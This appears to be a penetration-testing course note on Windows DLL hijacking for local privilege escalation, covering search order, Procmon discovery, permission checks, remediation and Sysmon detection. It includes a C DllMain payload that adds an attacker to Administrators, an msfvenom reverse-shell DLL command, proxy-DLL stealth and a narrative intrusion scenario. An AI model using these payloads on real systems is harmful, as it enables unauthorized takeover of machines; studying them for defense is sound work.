---
tags: [active-directory, intermediate, privesc, vapt]
difficulty: intermediate
module: "69 - AD Access Controls and Escalation Basics"
topic: "69.10 DLL Hijacking Basics"
---

# DLL Hijacking Basics for Privilege Escalation

## 1. Introduction and Executive Summary

Dynamic-Link Libraries (DLLs) are fundamental to the Windows Operating System. They contain shared code, data, and resources that multiple applications can invoke simultaneously, thereby promoting code reuse and memory efficiency. Because applications rarely contain all the code necessary to function autonomously, they dynamically load DLLs at runtime using Windows API functions such as `LoadLibrary` or `LoadLibraryEx`.

DLL Hijacking (also known as DLL Search Order Hijacking, DLL Preloading, or Phantom DLL Hijacking) is an exploitation technique that abuses the way Windows resolves and loads these external libraries. If an application attempts to load a DLL without specifying a hardcoded, absolute path, the Windows operating system resorts to a predefined search algorithm, looking through a specific order of directories to find the missing library. 

If an attacker can identify a directory within this search sequence that they have write access to, they can plant a malicious, identically named DLL. When the vulnerable application starts, it unknowingly loads the attacker's DLL instead of the legitimate one. If the vulnerable application runs with elevated privileges (e.g., a SYSTEM service or an administrator-run process), the malicious DLL executes within that high-privilege context, achieving immediate local privilege escalation (LPE).

## 2. Windows DLL Search Order Mechanics

Understanding DLL Hijacking requires a deep comprehension of the Windows DLL search algorithm. When an executable calls `LoadLibrary("example.dll")` without providing an absolute path (e.g., `C:\Program Files\App\example.dll`), the OS hunts for `example.dll` in a specific sequence.

Since Windows XP SP2, Microsoft introduced **SafeDllSearchMode**, which is enabled by default. This alters the search order slightly to mitigate some hijacking vectors.

### Standard Search Order (with SafeDllSearchMode Enabled)
1. **The directory from which the application loaded.** (The application's installation folder).
2. **The System directory.** (`C:\Windows\System32`)
3. **The 16-bit System directory.** (`C:\Windows\System`)
4. **The Windows directory.** (`C:\Windows`)
5. **The current working directory.** (The directory the user was in when launching the app).
6. **The directories listed in the system's PATH environment variable.**

*Note: The `KnownDLLs` registry key (`HKLM\System\CurrentControlSet\Control\Session Manager\KnownDLLs`) specifies core system DLLs (like `kernel32.dll`, `user32.dll`) that are strictly loaded from the System32 directory, bypassing the search order entirely. Attempting to hijack a KnownDLL is generally ineffective.*

## 3. Types of DLL Hijacking

There are several variations of DLL hijacking, each dependent on the specific vulnerability in the application.

### 3.1 Missing / Phantom DLL Hijacking
This occurs when an application attempts to load a DLL that does not exist anywhere on the system. Developers sometimes leave debugging libraries in the code, or reference deprecated DLLs. Because the DLL does not exist, the OS searches the entire search order, eventually checking the directories in the `%PATH%` environment variable. If an attacker has write access to any directory in the PATH, they can drop the malicious DLL.

### 3.2 DLL Search Order Hijacking
This occurs when the legitimate DLL *does* exist, but it resides lower in the search order hierarchy than a directory the attacker can write to. For example, if an application installed in `C:\Program Files\VulnerableApp\` tries to load `legit.dll` from `C:\Windows\System32\`, but the attacker can write to `C:\Program Files\VulnerableApp\`, the OS will find the attacker's DLL in Step 1 (Application Directory) before it ever checks Step 2 (System32).

## 4. Attack Flow Visualization

Below is an ASCII diagram outlining a DLL Search Order Hijacking scenario:

```text
+-----------------------------------------------------------------------------------+
|                            VULNERABLE APPLICATION STARTUP                         |
|  Target Executable: C:\EnterpriseApp\Service.exe (Runs as SYSTEM)                 |
|  Action: Calls LoadLibrary("helper.dll") [No absolute path provided]              |
+-----------------------------------------------------------------------------------+
                                        |
                                        v
+-----------------------------------------------------------------------------------+
|  OS SEARCH ALGORITHM BEGINS                                                       |
|                                                                                   |
|  STEP 1: Check Application Directory (C:\EnterpriseApp\)                          |
|  * Is helper.dll here? NO (Legitimate DLL is actually in System32)                |
+-----------------------------------------------------------------------------------+
                                        |
                                        v (VULNERABILITY WINDOW)
+-----------------------------------------------------------------------------------+
|  ATTACKER ACTION:                                                                 |
|  Standard user has write permissions to C:\EnterpriseApp\                         |
|  Attacker plants malicious "helper.dll" in C:\EnterpriseApp\                      |
+-----------------------------------------------------------------------------------+
                                        |
                                        v
+-----------------------------------------------------------------------------------+
|  OS SEARCH ALGORITHM RETRIES / RE-EVALUATES                                       |
|                                                                                   |
|  STEP 1: Check Application Directory (C:\EnterpriseApp\)                          |
|  * Is helper.dll here? YES! (It's the attacker's payload)                         |
|                                                                                   |
|  OS stops searching and loads C:\EnterpriseApp\helper.dll into memory.            |
+-----------------------------------------------------------------------------------+
                                        |
                                        v
+-----------------------------------------------------------------------------------+
|  EXECUTION: DllMain() executes inside Service.exe's memory space.                 |
|  Payload runs as NT AUTHORITY\SYSTEM. Privilege Escalation Successful!            |
+-----------------------------------------------------------------------------------+
```

## 5. Enumeration and Discovery

Discovering DLL Hijacking opportunities requires dynamic analysis. Because static analysis alone cannot easily reveal which DLLs an application fails to load at runtime, analysts rely heavily on Sysinternals `Procmon` (Process Monitor).

### 5.1 Using Process Monitor (Procmon)
To find missing DLLs or search order vulnerabilities, an attacker (or researcher in a lab environment) runs the target application while monitoring its behavior with Procmon.

**Procmon Filter Configuration:**
- `Process Name` is `vulnapp.exe` (or broadly filter out known noisy processes).
- `Result` is `NAME NOT FOUND`.
- `Path` ends with `.dll`.

When the application runs, Procmon will output lines showing `vulnapp.exe` attempting to read `helper.dll` in various directories and failing (`NAME NOT FOUND`). 

### 5.2 Evaluating Write Permissions
Once a missing DLL is identified and the searched paths are mapped out, the attacker checks if they have write access to any of those directories using `icacls` or `accesschk`.

```cmd
icacls "C:\EnterpriseApp\"
```
If the directory grants `(W)` to `BUILTIN\Users` or `Authenticated Users`, it is exploitable.
Similarly, verify if any directory listed in the `%PATH%` environment variable has weak permissions, which is common in environments where custom scripts or development tools (like Python or Node.js) are installed.

## 6. Weaponization and Exploitation

Creating the payload for DLL hijacking is slightly different than creating a standard executable. The payload must be a dynamically linked library.

### 6.1 Crafting the Malicious DLL
When a DLL is loaded, the OS automatically calls its entry point function, `DllMain`. The payload should execute within this function, typically under the `DLL_PROCESS_ATTACH` case.

A simple C/C++ payload to spawn a shell or add an administrator:
```cpp
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // The payload triggers as soon as the DLL is loaded
            system("cmd.exe /c net localgroup administrators attacker /add");
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```
Compile this code to a DLL using Mingw-w64:
```bash
x86_64-w64-mingw32-gcc payload.c -shared -o helper.dll
```
Alternatively, generate it using MSFVenom:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o helper.dll
```

### 6.2 Proxying DLL Exports (Advanced)
If the application absolutely relies on specific exported functions from the legitimate DLL to continue running, dropping a generic reverse shell DLL will cause the application to crash immediately upon loading (because the required functions are missing).

To prevent the crash and maintain stealth, an attacker must create a **Proxy DLL** (or Wrapper DLL). This malicious DLL exports the exact same functions as the legitimate DLL, executes the payload in `DllMain`, and then forwards all legitimate function calls to the actual DLL (which the attacker renames and keeps in the same folder). Tools like `Koppeling` or `DLLHijackAuditKit` automate the generation of these proxy DLLs.

### 6.3 Exploitation Execution
Transfer `helper.dll` to the vulnerable directory (e.g., `C:\EnterpriseApp\`).
Trigger the vulnerable application. If it's a service, restart the service. If it's a scheduled task, wait for it to run. The DLL is loaded, `DllMain` executes, and the privilege escalation is achieved.

## 7. Remediation and Defense

Fixing DLL Hijacking vulnerabilities requires action from both software developers and system administrators.

1. **Absolute Paths:** Developers should explicitly use absolute paths when calling `LoadLibrary` (e.g., `LoadLibrary("C:\\Windows\\System32\\helper.dll")`).
2. **SetDllDirectory:** Developers can use the `SetDllDirectory` API to modify the search path, removing the current working directory or specifying exact locations.
3. **Directory Permissions:** System administrators must rigorously enforce strict ACLs on software installation directories and directories listed in the `%PATH%` variable. Standard users should never have write access to directories where highly privileged services operate.

## 8. Detection Mechanisms

- **File System Integrity Monitoring (FIM):** Alert on `.dll` files being dropped into directories containing sensitive applications or directories listed in the `%PATH%`, particularly by non-administrative users.
- **Sysmon Event ID 7 (Image Loaded):** Monitor for DLLs loaded from unexpected paths. For instance, if `helper.dll` is consistently loaded from `System32`, an alert should trigger if `Service.exe` suddenly loads `helper.dll` from `C:\EnterpriseApp\`.
- **Unexpected Child Processes (Sysmon ID 1):** If a loaded DLL executes a payload (like `cmd.exe` or `powershell.exe`), monitor the process tree. A background service spawning command shells immediately after loading a DLL is highly anomalous.

## Real-World Attack Scenario

An attacker compromised an engineering workstation (`WS-ENG-05`) in a manufacturing company. They were operating as a low-privileged user and needed to escalate privileges to disable endpoint monitoring tools before exfiltrating proprietary CAD files.

The attacker fired up Sysinternals `Procmon` to observe running processes. They filtered for `Result is NAME NOT FOUND` and `Path ends with .dll`. They noticed a highly privileged engineering service, `AutoDraftSvc.exe` (running as SYSTEM), repeatedly attempting to load a missing library called `C:\DraftingTools\Bin\debug_helper.dll`. 

**The Execution:**
1. The attacker checked permissions on the target directory using `icacls "C:\DraftingTools\Bin"`. They found that developers had granted `(W)` (Write) permissions to `Authenticated Users` to easily update scripts.
2. The attacker crafted a malicious DLL payload using Mingw-w64 on their attack box. The payload was designed to spawn a command prompt and add their current user to the local Administrators group within the `DLL_PROCESS_ATTACH` routine.
3. They compiled the code into `debug_helper.dll`.
4. Using their write access, the attacker dropped `debug_helper.dll` into `C:\DraftingTools\Bin\`.
5. The attacker noticed the service attempted to load the DLL periodically every 15 minutes as part of a health check routine. They simply waited.

**The Outcome:**
Fifteen minutes later, `AutoDraftSvc.exe` executed its routine, called `LoadLibrary("debug_helper.dll")`, and successfully found the attacker's DLL. The OS loaded the DLL into the service's high-integrity memory space, executing the attacker's payload as `NT AUTHORITY\SYSTEM`. The attacker's user account was quietly added to the local Administrators group. The attacker logged out, logged back in with admin rights, bypassed UAC, and successfully disabled the endpoint telemetry before beginning data exfiltration.

## 9. Chaining Opportunities

- **UAC Bypasses:** DLL hijacking is the primary engine behind almost all modern User Account Control (UAC) bypasses. Attackers drop malicious DLLs into folders (like `C:\Windows\Tasks` or via `IFileOperation` COM abuse) where auto-elevating binaries (like `sysprep.exe` or `computerdefaults.exe`) are known to load missing DLLs.
- **Defense Evasion:** By hijacking a DLL loaded by a trusted, signed Microsoft binary, the attacker's code inherits the reputation of the host process, often bypassing Application Whitelisting (like AppLocker) and evading basic Antivirus behavioral analysis.
- **Persistence:** Dropping a hijacked DLL into the startup sequence of a commonly used application guarantees the attacker's payload will re-execute every time the user launches the application.

## 10. Related Notes
- [[06 - Exploiting Weak Service Permissions]]
- [[07 - Unquoted Service Paths in AD Environments]]
- [[05 - Bypassing User Account Control (UAC)]]
- [[08 - AlwaysInstallElevated Abuse]]
- [[11 - Token Impersonation and PrintSpoofer]]

Mastering DLL Hijacking bridges the gap between basic access misconfigurations and advanced persistence techniques, making it a critical skill for assessing local endpoint security.
